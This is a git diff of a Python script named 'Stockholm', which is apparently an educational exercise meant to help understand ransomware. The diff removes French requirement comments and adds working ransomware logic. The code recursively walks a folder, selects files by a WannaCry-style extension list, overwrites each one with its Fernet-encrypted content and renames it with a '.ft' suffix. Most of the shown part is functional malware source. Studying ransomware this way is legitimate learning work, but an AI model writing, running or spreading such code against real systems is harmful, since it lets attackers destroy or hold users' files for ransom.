@@ -40,17 +40,6 @@ wannacry_extensions: set[str] = {
     ".ppsx", ".sxi"
 }
 
-
-# trouver dossier infection dans le HOME du user
-
-
-# Les fichiers doivent être chiffres
-# Les fichiers doivent être renommés en ajoutant .ft, sauf si ils ont déjà le .ft
-
-# La clé doit faire au minimum 16 characteres
-
-# Dechiffrement, possibilité de dechiffrer les fichiers avec la clé
-
 def parse_arguments():
     desc = "Stockholm is a Python script designed for testing and \
         gaining a better understanding of how ransomware functions. \
@@ -77,16 +66,41 @@ def store_key(key: bytes) -> None:
         print(error)
         exit(1)
 
-def encrypt_file(filename: str):
-    print(filename)
+def add_extension(filepath: str)-> None:
+    if filepath.endswith(".ft"):
+        return
+    else:
+        os.rename(filepath, filepath + ".ft")
+
+def encrypt_file(key: bytes, filepath: str):
+    try:
+        with open(filepath, "rb") as file:
+            file_content = file.read()
+    except OSError as error:
+        print(error)
+        return
+    fernet = Fernet(key)
+    encrypted_content = fernet.encrypt(file_content)
+    try:
+        with open(filepath, "wb") as file:
+            file.write(encrypted_content)
+    except OSError as error:
+        print(error)
+        return
 
 def encryption(key: bytes, path: str)-> None:
     files = os.listdir(path)
     for filename in files:
-        if os.path.isdir(os.path.join(path, filename)) is True:
-            encryption(key, os.path.join(path, filename))
+        filepath = os.path.join(path, filename)
+        file_extension = "." + filepath.split(".")[-1]
+        if file_extension not in wannacry_extensions:
+            continue
+        if os.path.isdir(filepath) is True:
+            encryption(key, filepath)
         else:
-            encrypt_file(filename)
+            encrypt_file(key, filepath)
+            if file_extension != ".ft":
+                add_extension(filepath)
 
 def get_home()-> str:
     home: str = os.path.expanduser("~")
